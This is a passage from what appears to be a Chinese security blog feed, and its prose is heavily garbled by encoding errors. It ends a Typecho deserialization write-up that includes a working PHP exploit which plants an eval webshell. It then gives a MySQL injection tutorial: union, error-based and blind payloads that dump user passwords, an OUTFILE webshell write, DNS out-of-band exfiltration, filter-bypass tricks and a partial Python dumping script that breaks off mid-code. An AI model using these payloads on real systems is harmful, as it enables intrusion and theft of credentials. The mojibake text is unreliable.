ÁÑ∂ÂêéÂ∞±ÂèØ‰ª•Êää$_itemsÊï∞ÁªÑÊâÄÂú®ÁöÑTypecho_FeedÁ±ªÔºåÂÆû‰æãÂåñ‰º†Áªô$adapterÔºå‰ªéËÄåËß¶Âèë\_tostring(2)ÔºåÁÑ∂Âêé__construct(1)Ëá™Âä®ÊâßË°åÔºåÂç≥ÊûÑÊàê‰∫ÜÂÆåÊï¥ÁöÑ‰∏ÄÊù°ÊîªÂáªÈìæ„ÄÇ ÊÄªÁöÑÊù•ËØ¥ÔºåÁé∞Âú®Â∞±ÂæàÂ•ΩÁêÜËß£Ëøô‰∫õÊï∞ÁªÑÁöÑÂµåÂ•óÂÖ≥Á≥ª‰∫Ü„ÄÇ12345678910111213141516171819202122232425262728293031323334Array( [adapter] =&gt; Typecho_Feed Object ( [_type:Typecho_Feed:private] =&gt; RSS 2.0 [_version:Typecho_Feed:private] =&gt; 1 [_charset:Typecho_Feed:private] =&gt; UTF-8 [_lang:Typecho_Feed:private] =&gt; en [_items:Typecho_Feed:private] =&gt; Array //$_itemssÊï∞ÁªÑ ( [0] =&gt; Array //$itemÊï∞ÁªÑ ( [author] =&gt; Typecho_Request Object //$item[&apos;author&apos;]Ëµã‰∫à‰∏Ä‰∏™ÂØπË±°ÂÄºÔºåËß¶Âèë__get() ( [_params:Typecho_Request:private] =&gt; Array ( [screenName] =&gt; file_put_contents(&apos;Passer6y.php&apos;, &apos;&lt;?php eval($_POST[1]);?&gt;&apos;) ) [_filter:Typecho_Request:private] =&gt; Array ( [0] =&gt; assert ) ) ) ) ) [prefix] =&gt; th1s) EXP(copy from Ph0rseÂ§ß‰Ω¨)Ôºö1234567891011121314151617181920212223242526272829303132333435&lt;?php//ÂΩì__getÊñπÊ≥ïÊâßË°åÊó∂Ôºå‰ΩøÁî®assertÂáΩÊï∞Ë∞ÉÁî®file_put_contentsÂáΩÊï∞ÔºåÂÜôÂÖ•Êú®È©¨class Typecho_Request&#123; private $_params = array('screenName' =&gt; "file_put_contents('Passer6y.php', '&lt;?php eval(\$_POST[1]);?&gt;')"); private $_filter = array('assert');&#125;//ÊûÑÈÄ†FeedÁ±ªÔºå‰Ωø__getÊñπÊ≥ïÊâßË°åclass Typecho_Feed&#123; const RSS2 = "RSS 2.0"; private $_type; private $_version; private $_charset; private $_lang; private $_items = array(); public function __construct($version, $type = self::RSS2, $charset = 'UTF-8', $lang = 'en')&#123; $this-&gt;_version = $version; $this-&gt;_type = $type; $this-&gt;_charset = $charset; $this-&gt;_lang = $lang; &#125; public function addItem(array $item)&#123; $this-&gt;_items[] = $item; &#125;&#125;$class1 = new Typecho_Feed(1);$class2 = new Typecho_Request();$class1-&gt;addItem(array('author' =&gt; $class2));$exp = array('adapter' =&gt; $class1, 'prefix' =&gt; 'th1s');echo base64_encode(serialize($exp));?&gt; 0x05.Â¶Ç‰ΩïÈò≤Âæ°1.ËøáÊª§ÔºöËØïÊÉ≥‰∏Ä‰∏ãÔºåÂΩìunserializeÊâßË°åÁöÑÊó∂ÂÄôÔºå‰ºöË∞ÉÁî®Ëá™Âä®__wakeupÈ≠îÂπªÂáΩÊï∞ÔºåÊàë‰ª¨ÂèØ‰ª•Âà©Áî®ËøôÁÇπÔºåÂØπÁî®Êà∑ÂèØÊéßÁöÑÊï∞ÊçÆËøõË°å‰∏•Ê†ºËøáÊª§Ôºå‰Ωø‰πã‰∏çËÉΩÊàêÂäüÊéßÂà∂Â±ûÊÄßÂÄº„ÄÇ 2.‰ΩøÁî®get_included_filesÂáΩÊï∞Êü•ÁúãÊòØÂê¶ÊúâÊºèÊ¥ûÁöÑÁ±ªË¢´ÂåÖÂê´‰∫Ü 3.Â∞ΩÈáè‰ΩøÁî®json_endcode/json_decodeÊù•Âèñ‰ª£ ÂèÇËÄÉËµÑÊñôÔºö1.ÊºèÊ¥ûÂàÜÊûê‰πãTypecho‰∫åËøûÁàÜ2.PHPÂ∫èÂàóÂåñ3.‰∏ÄÈÅìÂèçÂ∫èÂàóÂåñCTFÂºïËµ∑ÁöÑÊÄùËÄÉ4.POPÈìæÁöÑÊûÑÈÄ†5.PHP‰∏≠SESSIONÂèçÂ∫èÂàóÂåñÊú∫Âà∂ËØ¶Ëß£6.TypechoÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂØºËá¥ÂâçÂè∞getshell7.ÈÄöËøáPHPÂèçÂ∫èÂàóÂåñËøõË°åËøúÁ®ã‰ª£Á†ÅÊâßË°å8.POPÈìæÂíåÂ∫èÂàóÂåñÔºåÂèçÂ∫èÂàóÂåñÊìç‰Ωú 9.phpÂØπË±°Ê≥®ÂÖ•ÊÄªÁªì10.PHPÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÊàêÂõ†ÂèäÊºèÊ¥ûÊåñÊéòÊäÄÂ∑ß‰∏éÊ°à‰æã]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>PHPÂèçÂ∫èÂàóÂåñ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySql Injection Conclusion]]></title>
    <url>%2F2017%2F12%2F23%2FSql%20injection%20Conclusion%2F</url>
    <content type="text"><![CDATA[0x02 Âü∫‰∫éÊúâÊ≠£Á°ÆÂõûÊòæÁöÑÊ≥®ÂÖ•1.Âà§Êñ≠Ê≥®ÂÖ•ÁÇπ„ÄÅÊ≥®ÂÖ•‰ΩçÁΩÆ2.Âà§Êñ≠ÊòØÂê¶Ë¢´ËøáÊª§ÔºåÁªïËøá3.order byËÅîÂêàÊü•ËØ¢ÔºåÊâæÂà∞ÂØπÂ∫îÁöÑÂàóÊï∞4.ËÅîÂêàÊü•ËØ¢Ê≥®ÂÖ•ÔºöËøôÈáåÂÅáËÆæÊúâ‰∏â‰∏™Â≠óÊÆµ‚ë†ÁàÜÂ∫ìÔºö id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata --+ ‚ë°ÁàÜË°®ÂêçÔºöËøôÈáåÂÅáËÆæÁàÜÂá∫‰∫ÜsecurityÊï∞ÊçÆÂ∫ì id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos; --+ ‚ë¢ÁàÜÂàóÂêç:ÂÅáËÆæÁàÜÂá∫‰∏Ä‰∏™usersË°® id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos; --+ ‚ë£ÁàÜÊï∞ÊçÆÔºö id=-1&apos; Union select 1,username,password from users limit 0,1 --+ Tips: ÊúâÊó∂ÂÄôÂèØËÉΩÂΩìÂâçÈ°µÈù¢Êï∞ÊçÆÂ∫ìÂíåÊïèÊÑü‰ø°ÊÅØÊï∞ÊçÆÂ∫ì‰∏çÊòØÂêå‰∏Ä‰∏™Â∫ìÔºåÊâÄ‰ª•ÊúâÊó∂ÂÄô‰ºöËøôÊ†∑ÂÜôid=-1‚Äô Union select 1,username,password from security.users limit 0,1 ‚Äì+ÊàñËÄÖid=-1‚Äô Union select 1,username,password from `users` limit 0,1 ‚Äì+ 0x03 Âü∫‰∫éÊûÑÈÄ†ÈîôËØØsqlËØ≠Âè•ÁöÑÊä•ÈîôÊ≥®ÂÖ•1. ÈúÄË¶ÅÁü•ÈÅì‰ª•‰∏ãÂá†‰∏™ÂáΩÊï∞Ôºö ‚ë†Group by: ÂàÜÁªÑÔºåÂêàÂπ∂Áõ∏ÂêåÁöÑÔºåÂπ∂‰∏îÊåâÂ≠óÊØçÈ°∫Â∫èÊéíÂàó„ÄÇ ‚ë°rand() // ÈöèÊú∫ÂáΩÊï∞Ôºà0Ôºå1Ôºâ ‚ë¢floor() //ÂèñÊï¥ÂáΩÊï∞ ÊØîÂ¶Çfloor(1.2)=1 ‚ë£count() //Ê±áÊÄªÂáΩÊï∞2. ÂéüÁêÜ: ÁÆÄËÄåË®Ä‰πãÂ∞±ÊòØÂà©Áî® select count(),concat(floor(random(0)2))as key from‚Ä¶‚Ä¶.group by keyÊù•Êä•Èîô„ÄÇ Âç≥randÂáΩÊï∞‰∫ßÁîüÁöÑÈöèÊú∫Êï∞ÂèñÊï¥‰πãÂêéË¢´ group by Â≠êÂè•Ë¢´ÂàÜ‰∏∫keyÂÄºÁ≠â‰∫é1 Âíå0 ‰∏§Á±ªÔºåÁÑ∂Âêécount()ÁªüËÆ°ËØ•Á±ªÂûã‰∏ãÁöÑ‰∏™Êï∞ ÂèØ‰ª•ÂèëÁé∞ÊúâÊó∂ÂÄôÂõûÊä•Èîô Êàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøáËøôÁßçÊâãÊÆµÊù•Ëé∑ÂèñÊïèÊÑü‰ø°ÊÅØ ÈÇ£‰πàÈóÆÈ¢òÊù•‰∫ÜÔºö‰∏∫‰ªÄ‰πà‰ºöÊä•ÈîôÂë¢Ôºü ÂèåÊ≥®ÂÖ•ÁöÑÂéüÁêÜÔºåÁÆÄÂçï‰∏ÄÂè•ËØùÂéüÁêÜÂ∞±ÊòØÊúâÁ†îÁ©∂‰∫∫ÂëòÂèëÁé∞ÔºåÂΩìÂú®‰∏Ä‰∏™ËÅöÂêàÂáΩÊï∞ÔºåÊØîÂ¶ÇcountÂáΩÊï∞ÂêéÈù¢Â¶ÇÊûú‰ΩøÁî®ÂàÜÁªÑËØ≠Âè•Ôºàgroup byÔºâÂ∞±‰ºöÊääÊü•ËØ¢ÁöÑ‰∏ÄÈÉ®ÂàÜ‰ª•ÈîôËØØÁöÑÂΩ¢ÂºèÊòæÁ§∫Âá∫Êù•‚ÄúÈÄöËøáfloorÊä•ÈîôÁöÑÊñπÊ≥ïÊù•ÁàÜÊï∞ÊçÆÁöÑÊú¨Ë¥®ÊòØgroup byËØ≠Âè•ÁöÑÊä•Èîô„ÄÇ Group by Âú®ÂàÜÁªÑÁöÑÊó∂ÂÄôÂÖà‰ºöÂØπÂâçÈù¢ÁöÑconcat(floor(rand()*2))ËøõË°åÊ£ÄÊµãÔºåÊó†ÁñëÂè™Êúâ0Âíå1 ‰∏§ÁßçÁªìÊûú ËøõË°åÂàÜÁ±ªÔºåÁÑ∂ÂêéÂ∞±‰ºöÊèíÂÖ•ËøôÊù°Êï∞ÊçÆ ÊèíÂÖ•ÁöÑËøáÁ®ã‰∏≠Âèà‰ºöÂÜçËøõË°å‰∏ÄÊ¨°ËÆ°ÁÆó Â¶ÇÊûúÊ£ÄÊµãÊâÄËÆ°ÁÆóÂá∫Êù•ÁöÑÊï∞ÂíåÊèíÂÖ•Êó∂ÊâÄËÆ°ÁÆóÂá∫Êù•ÁöÑÊï∞‰∏ç‰∏ÄÊ†∑ÔºåËøô‰∏™Êó∂ÂÄôÂ∞±‰ºöÊä•Èîô„ÄÇ&lt;br /&gt; 3.ÂÆûÈôÖÊìç‰Ωú(ÂíåÊúâÊ≠£Á°ÆÂõûÊòæÁöÑÊìç‰ΩúÁ±ª‰ºº)‚ë†ÁàÜÂ∫ìÔºö ?id=-1&apos; and (select 1 from (select count(*),concat(0x3a,(select schema_name from information_schema.schemata limit 0,1 ),floor(rand()*2 ),0x3a,0x3a )name from information_schema.tables group by name) b) --+ ‚ë°ÁàÜË°®Âêç‚ë¢ÁàÜÂàóÂêç‚ë£ÁàÜÊï∞ÊçÆÔºö ?id=-1&apos; and (select 1 from (select count(*),concat(0x3a,(select password from users limit 0,1 ),floor(rand()*2 ),0x3a,0x3a )name from information_schema.tables group by name) b) --+ ÂÖ∂‰ªñÊõ¥Â§öÂáΩÊï∞ÁöÑÊä•ÈîôÊ≥®ÂÖ•extractvalue()„ÄÅupdatexml()„ÄÅGeometryCollection()„ÄÅpolygon()„ÄÅmultipoint()„ÄÅmultilinestring()„ÄÅmultipolygon()„ÄÅlinestring()„ÄÅexp()‰ª•ÂêéÂÜçÊ∑±ÂÖ•ÁªÉ‰π†Âêß.. 0x04Âü∫‰∫éÊñá‰ª∂ËØªÂÜôÊùÉÈôêÁöÑÊ≥®ÂÖ•1.ÂâçÊèêÔºöÈúÄË¶Åmy.ini(phpstudy‰∏≠)ÈáåÈù¢ÁöÑ secur_file_privÂèòÈáè‰∏∫Á©∫Ôºå‰∏çÊï¢‰∏ÄËà¨MySQL5.5.53‰πãÂâçÁöÑÁâàÊú¨ÈªòËÆ§‰∏∫Á©∫Ôºå‰πãÂêéÁöÑÁâàÊú¨‰∏∫nullÔºåÊâÄ‰ª•ËØ¥ËøôÁßçÊ≥®ÂÖ•ÊØîËæÉ‰æùËµñMySQLÁöÑÁâàÊú¨„ÄÇÂèØ‰ª•‰ΩøÁî®Ôºöselect @@secure_file_privÊù•Êü•ËØ¢ÊùÉÈôê„ÄÇÂÖ≥‰∫ésecur_file_privÂèòÈáèÊõ¥Â§öÔºö Â¶ÇÊûúÂèòÈáèËÆæÁΩÆ‰∏∫ÁõÆÂΩïÁöÑÂêçÁß∞ÔºåÂàôÊúçÂä°Âô®‰ºöÂ∞ÜÂØºÂÖ•ÂíåÂØºÂá∫Êìç‰ΩúÈôêÂà∂Âú®Ë∑üËøô‰∏™ÁõÆÂΩï‰∏≠‰∏ÄËµ∑‰ΩøÁî®„ÄÇËøô‰∏™ÁõÆÂΩïÂøÖÈ°ªÂ≠òÂú®ÔºåÊúçÂä°Âô®‰∏ç‰ºöËá™Â∑±ÂàõÂª∫ÂÆÉ„ÄÇÂ¶ÇÊûúÂèòÈáè‰∏∫Á©∫ÔºåÂàô‰∏ç‰ºö‰∫ßÁîüÂΩ±ÂìçÔºåÂºïËµ∑‰∏çÂÆâÂÖ®ÁöÑÈÖçÁΩÆ„ÄÇÂ¶ÇÊûúÂèòÈáèËÆæÁΩÆ‰∏∫NULLÔºåÈÇ£‰πàÊúçÂä°Âô®Â∞±‰ºöÁ¶ÅÁî®ÂØºÂÖ•ÂíåÂØºÂá∫Êìç‰Ωú„ÄÇËøô‰∏™ÂÄº‰ªéMySQL 5.5.53ÁâàÊú¨ÂºÄÂßãÂÖÅËÆ∏„ÄÇ 2.ÈúÄË¶ÅÁü•ÈÅìÁöÑÂáΩÊï∞Ôºö‚ë†Load_fileÔºöËØªÊñá‰ª∂‚ë°INTO DUMPFILE/OUTFILEÔºöÂ∞ÜË°®ÁöÑÂÜÖÂÆπÂØºÂá∫‰∏∫‰∏Ä‰∏™ÊñáÊú¨Êñá‰ª∂ TipsÔºöINTO OUTFILEÂáΩÊï∞ÂÜôÊñá‰ª∂Êó∂‰ºöÂú®ÊØè‰∏ÄË°åÁöÑÁªìÊùüËá™Âä®Âä†‰∏äÊç¢Ë°åÁ¨¶INTO DUMPFILEÂáΩÊï∞Âú®ÂÜôÊñá‰ª∂‰ºö‰øùÊåÅÊñá‰ª∂ÂæóÂà∞ÂéüÁîüÂÜÖÂÆπÔºåËøôÁßçÊñπÂºèÂØπ‰∫é‰∫åËøõÂà∂Êñá‰ª∂ÊòØÊúÄÂ•ΩÁöÑÈÄâÊã© ÂÆûÈôÖÊºîÁ§∫Ôºöselect * from users into outfile ‚Äòd:/1.txt‚Äô;select load_file(‚Äòd:/1.txt‚Äô)3.ÂÆûÈôÖÊìç‰Ωú(‰∏§ÁßçÊÄùË∑Ø)‚ë†‰∏äËèúÂàÄ ?id=1&apos;)) union select 1,2,0x3c3f70687020706870696e666f28293b3f3e into outfile &apos;D:/phpStudy/www/1234.php&apos; --+ TipsÔºö?Âú®URLÈáåÈù¢Ë°®Á§∫‰º†ÂèÇÔºåÂ¶ÇÊûú‰∏ÄÂè•ËØùÊú®È©¨ÈáåÈù¢Êúâ ?php ÊâÄ‰ª•Áî®get‰º†ÂèÇÁöÑ ‰ºöÂ∞ÜphpÂΩì‰ΩúÂèòÈáè„ÄÇ ‚ë°ÊîπÊâ©Â±ïÂêçÁªïËøáÊìç‰ΩúÔºö ?id=1&apos;)) union select 1,2,load_file(&apos;D:/phpStudy/www/1234.php&apos;) into outfile &apos;D:/phpStudy/www/123455.txt&apos; --+ 0x05Áõ≤Ê≥®1.Áõ∏ÂÖ≥ÂáΩÊï∞Ôºö‚ë†length():ËøîÂõûÂ≠óÁ¨¶‰∏≤ÁöÑÈïøÂ∫¶‚ë°substr():Êà™ÂèñÂ≠óÁ¨¶‰∏≤ substr(a,b,c)‰ªéb‰ΩçÁΩÆÂºÄÂßãÔºåÊà™ÂèñÂ≠óÁ¨¶‰∏≤aÁöÑcÈïøÂ∫¶Ôºåascii()Â∞ÜÂ≠óÁ¨¶ËΩ¨Êç¢‰∏∫asciiÁ†ÅÊ†ºÂºè„ÄÇ‚ë¢ascii():ËøîÂõûÂ≠óÁ¨¶ÁöÑasciiÁ†Å‚ë£if():If(exor1,expr2,expr3)Âú®mysql‰∏≠ÊòØÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊàêÁ´ãÁöÑÊó∂ÂÄôÊâßË°åÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÔºåÂê¶ÂàôÊâßË°åÁ¨¨‰∏â‰∏™ÂèÇÊï∞2.ÂÆûÈôÖÊìç‰ΩúÔºö‚ë†Âà§Êñ≠Ê≥®ÂÖ•ÁÇπÔºö Id=-1&apos; or sleep(5) --+ ‚ë°ÁàÜÂ∫ìÔºö If(Ascii(substr(select schema_name from information_schema.schemata limit 0,1),1,1))=100,sleep(),null)as name ‚ë¢ÁàÜË°®‚ë£ÁàÜÂ≠óÊÆµ‚ë§ÁàÜÊï∞ÊçÆÈÉΩÊòØ‰∏ÄÊ†∑ÁöÑÂ•óË∑Ø TipsÔºösubstr()ÁöÑÂ∞èÊäÄÂ∑ßÔºö‰æãÂ¶ÇÂú®substr(database(),1,1)‰∏≠ÈÄóÂè∑Ë¢´ËøáÊª§‰∫ÜÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®from 1 to 1Êù•ÁªïËøáËøáÊª§„ÄÇÈÇ£‰πàÊúâÂêåÊ†∑Ê†ºÂºèÁöÑlimit 0,1ÊúâÊ≤°ÊúâËøôÊ†∑ÁöÑÁªïËøáÂë¢ÔºüÂΩìÁÑ∂Êúâ„ÄÇÊ†ºÂºè‰∏∫Ôºö1 offset 0ËøôÈáåÊ≥®Êü•ËØ¢Êï∞Â≠óÁöÑÈ°∫Â∫è„ÄÇ 0x06Â§öÁßç‰ΩçÁΩÆÁöÑÊ≥®ÂÖ•ÔºöÂÖ∂ÂÆûÈÉΩÊòØ‰∏ÄÊ†∑ÁöÑÊñπÊ≥ïÔºåÂè™ÊòØ‰ΩçÁΩÆ‰∏ç‰∏ÄÊ†∑„ÄÇ‰∏ÄËà¨Êù•ËØ¥ÔºåÊúâ‰ª•‰∏ãÂá†ÁßçÊ≥®ÂÖ•‰ΩçÁΩÆÔºö1.Get„ÄÅPost2.UAÂ§¥3.refererÂ§¥4.cookie 0x07Â∏¶Â§ñÈÄöÈÅìÔºö‰ªÄ‰πàÊòØÂ∏¶Â§ñÈÄöÈÅìÊ≥®ÂÖ•Ôºü ‰ΩøÁî®ËÉåÊôØÔºöÂú®ËøõË°åsqlÊ≥®ÂÖ•ÊîªÂáªÁöÑÊó∂ÂÄôÊàë‰ª¨ÁªèÂ∏∏‰ºöÈÅáËßÅÊó†ÂõûÊòæÁöÑÊÉÖÂÜµÔºåÈÇ£Êàë‰ª¨Â∞±‰∏çËÉΩËøõË°åÊ≥®ÂÖ•‰∫Ü‰πàÔºüÂÖ∂ÂÆûÊîªÂáªÂèØËÉΩÂ∑≤ÁªèÊàêÂäü‰∫ÜÔºåButÂ∫îÁî®Á®ãÂ∫èÊú™ËøîÂõû‰ªª‰ΩïÁªìÊûúÔºå‰Ωø‰Ω†ËØØ‰ª•‰∏∫ÊîªÂáªÂ§±Ë¥•„ÄÇ‰∏ÄÁßçËé∑ÂèñÊï∞ÊçÆÁöÑÊúâÊïàÊñπÊ≥ïÊòØ‰ΩøÁî®Â∏¶Â§ñÈÄöÈÅìËÉΩÂ§üÂú®Êï∞ÊçÆÂ∫ì‰∏≠ÊâßË°å‰ªªÊÑèSQLËØ≠Âè•Âêé,Êàë‰ª¨ÂèØ‰ª•Âà©Áî®Êï∞ÊçÆÁöÑ‰∏Ä‰∫õÂÜÖÁΩÆÂäüËÉΩÂú®Êï∞ÊçÆÂ∫ì‰∏éËá™Â∑±ÁöÑËÆ°ÁÆóÊú∫Áõ¥Êé•Âª∫Á´ãÁΩëÁªúËøûÊé•,ÈÄöËøáÂÆÉ‰º†ÈÄÅ‰ªéÊï∞ÊçÆÂ∫ì‰∏≠Êî∂ÈõÜÁöÑ‰ªª‰Ωï‰ø°ÊÅØ‰∏ÄËà¨ÂèØ‰ª•ÊèêÂèñÊï∞ÊçÆÁöÑÈÄîÂæÑ:ÈÄöËøáHTTP(S)ËØ∑Ê±Ç„ÄÅDNSÂâñÊûê„ÄÅÊñá‰ª∂Á≥ªÁªü„ÄÅÁîµÂ≠êÈÇÆ‰ª∂Á≠âÁ≠â ÂØπ‰∫éMySQLËÄåË®ÄÂêåÊ†∑ÂíåÊñá‰ª∂ËØªÂÜô‰∏ÄÊ†∑ÔºåÈúÄË¶Åsecure_file_privËøô‰∏™ÂÖ®Â±ÄÂèòÈáèÊéßÂà∂ÁöÑÊùÉÈôêÔºåÂÖ∑‰ΩìËßÅ0x03‰∏≠ÂØπËØ•ÂèòÈáèÁöÑ‰ªãÁªç„ÄÇÂà©Áî®Êù°‰ª∂Ôºö ÂÖ®Â±ÄÂèòÈáèsecure_file_priv = ‚Äò ‚Äò ÂèØ‰ª•Áî®SQL serverËøûÊé•Âà∞mysqlÊï∞ÊçÆÂ∫ì ‰ΩøÁî®DNSËß£ÊûêÊèêÂèñÊï∞ÊçÆÂú®mysql‰∏≠‰ºöÂØπÊü•ËØ¢ËØ≠Âè•‰∏≠ÁöÑipÂíåÁΩëÂùÄÂ∞ùËØïDNSËß£Êûê„ÄÇ‰æãÂ¶ÇÔºö select load_file(concat(‚Äò\\\\‚Äô,version()‚Äôyoursite.com\\a.txt‚Äô)); ÁÑ∂ÂêéÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáÊäìÂåÖÁúãMySqlÂèëÂá∫ÁöÑDNSÊü•ËØ¢Êï∞ÊçÆÊàñËÄÖ‰ΩøÁî®ÁΩë‰∏äÁé∞ÊàêÁöÑhttps://dnsbin.zhack.ca/ Â∞±ÂèØ‰ª•ÁúãÂà∞mysqlÂèëÈÄÅËøáÊù•ÁöÑÊï∞ÊçÆ 0x08ÂêÑÁßçÁªïËøáÂßøÂäøÔºöÁªïËøáÂçïÂºïÂè∑ Â§ßÂ∞èÂÜôÁªïËøá ?id=1+UnIoN+SeLecT+1,2,3-- ÊõøÊç¢ÁªïËøá ?id=1+UNunionION+SEselectLECT+1,2,3-- Ê≥®ÈáäÁªïËøá ?id=1+un/**/ion+se/**/lect+1,2,3-- ÁâπÊÆäÂµåÂÖ•ÁªïËøá ?id=1/*!UnIoN*/SeLecT+1,2,3-- //Âú®Âà´ÁöÑÊï∞ÊçÆÂ∫ì‰∏≠ÊòØÊ≥®Èáä‰ΩÜÊòØÂú®mysql‰∏≠ÂèØ‰ª•ÊàêÂäüÊâßË°åÂú®ËØ≠Âè•ÂâçÂèØ‰ª•Âä†‰∏ä5‰ΩçÊï∞Â≠óÔºå‰ª£Ë°®ÁâàÊú¨Âè∑ÔºåË°®Á§∫Âè™ÊúâÂú®Â§ß‰∫éËØ•ÁâàÊú¨ÁöÑmysql‰∏≠‰∏ç‰Ωú‰∏∫Ê≥®Èáä ÂÆΩÂ≠óËäÇÊ≥®ÂÖ•SQLÊ≥®ÂÖ•‰∏≠ÁöÑÂÆΩÂ≠óËäÇÂõΩÂÜÖÊúÄÂ∏∏‰ΩøÁî®ÁöÑgbkÁºñÁ†ÅÔºåËøôÁßçÊñπÂºè‰∏ªË¶ÅÊòØÁªïËøáaddslashesÁ≠âÂØπÁâπÊÆäÂ≠óÁ¨¶ËøõË°åËΩ¨ÁßªÁöÑÁªïËøá„ÄÇÂèçÊñúÊù†()ÁöÑÂçÅÂÖ≠ËøõÂà∂‰∏∫%5cÔºåÂú®‰Ω†ËæìÂÖ•%bf%27Êó∂ÔºåÂáΩÊï∞ÈÅáÂà∞ÂçïÂºïÂè∑Ëá™Âä®ËΩ¨ÁßªÂä†ÂÖ•\ÔºåÊ≠§Êó∂Âèò‰∏∫%bf%5c%27Ôºå%bf%5cÂú®gbk‰∏≠Âèò‰∏∫‰∏Ä‰∏™ÂÆΩÂ≠óÁ¨¶‚ÄúÁ∏ó‚Äù„ÄÇ%bfÈÇ£‰∏™‰ΩçÁΩÆÂèØ‰ª•ÊòØ%81-%fe‰∏≠Èó¥ÁöÑ‰ªª‰ΩïÂ≠óÁ¨¶„ÄÇ‰∏çÊ≠¢Âú®sqlÊ≥®ÂÖ•‰∏≠ÔºåÂÆΩÂ≠óÁ¨¶Ê≥®ÂÖ•Âú®ÂæàÂ§öÂú∞ÊñπÈÉΩÂèØ‰ª•Â∫îÁî®„ÄÇÂú®Êàë‰ª¨‰ª£Á†ÅÂÆ°ËÆ°ÁöÑËøáÁ®ã‰∏≠‰∫ßÁîüËøô‰∏™Ê≥®ÂÖ•ÁöÑÂéüÂõ†Êúâ‰∏§‰∏™1.character_set_client=gbk(SET NAMESÁöÑËØØÁî®)2.mysql_real_escape_string()ÁöÑÈîôËØØ‰ΩøÁî® ‰∫åÊ¨°urldecodeÊ≥®ÂÖ•ÁªïËøáÂú®Êàë‰ª¨‰ª£Á†ÅÂÆ°ËÆ°ÁöÑÊó∂ÂÄôÂ¶ÇÊûúÊüêÂ§ÑÁî®‰∫ÜurldecodeÊàñËÄÖrawurldecodeÂáΩÊï∞ÔºåÂàô‰ºö‰∫åÊ¨°Ëß£Á†Å(webserverÂíåËØ•ÂáΩÊï∞)ËÄåÁªïËøágpcÊàñËÄÖÊòØaddslashesÁ≠âËøáÊª§ÂáΩÊï∞„ÄÇ ÁâπÊÆäÂ≠óÁ¨¶ÁªïËøáÁ©∫Ê†º Example: &apos;%0AUNION%0CSELECT%A0NULL%20%23 Ê≥®ÈáäÁ¨¶&amp;ÂºïÂè∑ ‚ë†SELECT DISTINCT(db) FROM mysql.db WHERE `Host`=&apos;localhost&apos; and/**/1=1; ‚ë°SELECT DISTINCT(db) FROM mysql.db WHERE `Host`=&apos;localhost&apos; and&quot;1=1&quot;; ÁºñÁ†ÅÁªïËøáURLÁºñÁ†Å„ÄÅHEXÁºñÁ†Å„ÄÅBase64ÁºñÁ†Å 0x09Âà©Áî®Â∑•ÂÖ∑1.sqlmap2.PangolinÔºàÁ©øÂ±±Áî≤Ôºâ3.DomainÁ≠âÁ≠â 0x10Â¶Ç‰ΩïÁî®pythonÂÜôÂ∑•ÂÖ∑ÔºüÂú®ÊàëÁÆÄÂçïÂ≠¶‰π†‰∫ÜrequestsÂ∫ì„ÄÅÂíåreÂ∫ì‰πãÂêéÔºåÁºñÂÜô‰∫Ü‰∏Ä‰∏™ÁÆÄÂçïÁöÑËÑöÊú¨(Á¨¨‰∏ÄÊ¨°ÂÜôbugÊúâÁÇπÂ§ö„ÄÅÂ±ÄÈôê‰πüÂæàÂ§ö..) #coding=UTF-8 import re import requests from bs4 import BeautifulSoup import sys reload(sys) sys.setdefaultencoding(&apos;utf8&apos;) def getHTMLText(url): try: r = requests.get(url) r.raise_for_status() r.encoding = r.apparent_encoding return r.text except: print(&quot;getHTMLText error&quot;) return &quot;getHTMLText right&quot; #ÊçïÊçâËøîÂõûÁöÑÈîôËØØÔºåÂà§Êñ≠Ê≥®ÂÖ•ÁÇπ def sqlloc_error(html,url,lists): try: error = re.search(r&apos;syntax&apos;,html) if error: lists.append(url) except: return &quot;rightback error&quot; #ÊûÑÈÄ†Ê≥®ÂÖ•ÁÇπÁöÑurl def testsql(start_url,lists): injects = [&apos;\&apos;&apos; , &apos;\&quot;&apos; ,&apos;)&apos;, &apos;\&apos;)&apos;, &apos;\&quot;)&apos;] for inject in injects: url = start_url + inject html = getHTMLText(url) sqlloc_error(html,url,lists) #ÊçïÊçâÁàÜÂ∫ìËøîÂõûÁöÑÂ≠óÊÆµ def sqlrep_back(html,payload_reps): try: soup = BeautifulSoup(html,&quot;html.parser&quot;) Rep = soup.select(&quot;font &gt; font&quot;) NRep = Rep[0].text NNRep = NRep.split(&apos;:&apos;)[2] num = len(NNRep.split(&apos;,&apos;)) for i in range(num): payload_reps.append(NNRep.split(&apos;,&apos;)[i]) print(payload_reps[i]) except: return &quot;sqlrep_back error&quot; #ÁàÜÂ∫ì(ËøôÈáåËøòÊ≤°ÊúâÂÆûÁé∞Ëá™Âä®Âà§Êñ≠Â≠óÊÆµÊï∞Ôºå‰∏ãÈù¢ÁöÑpayload‰πüÂèØ‰ª•ÂÜôÊàêÊâπÈáè) def BoomRepository(list,payload_reps): newurl = list + &quot; union select 1,2,group_concat(schema_name) from information_schema.schemata --+&quot; html = getHTMLText(newurl) sqlrep_back(html,payload_reps) #ÊçïÊçâÁàÜÂá∫ÁöÑË°® def sqltab_back(html,payload_tables): try: soup = BeautifulSoup(html,&apos;html.parser&apos;) Tab = soup.select(&quot;font &gt; font&quot;) NTab = Tab[0].text NNTab = NTab.split(&apos;:&apos;)[2] num = len(NNTab.split(&apos;,&apos;)) for i in range(num): payload_tables.append(NNTab.split(&apos;,&apos;)[i]) print(payload_tables[i]) except: print(&quot;sqltab_back error&quot;) #ÁàÜË°® def BoomTable(list,payload_columns,payload_tables,payload_reps): for payload_rep in payload_reps: newurl = list + &quot; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&apos;&quot; + payload_rep + &quot;&apos; --+&quot; print(&quot;-----------Ê≠£Âú®ÁàÜ&quot; + payload_rep + &quot;Â∫ìÁöÑË°®-----------&quot;) html = getHTMLText(newurl) sqltab_back(html,payload_tables) for payload_table in payload_tables: 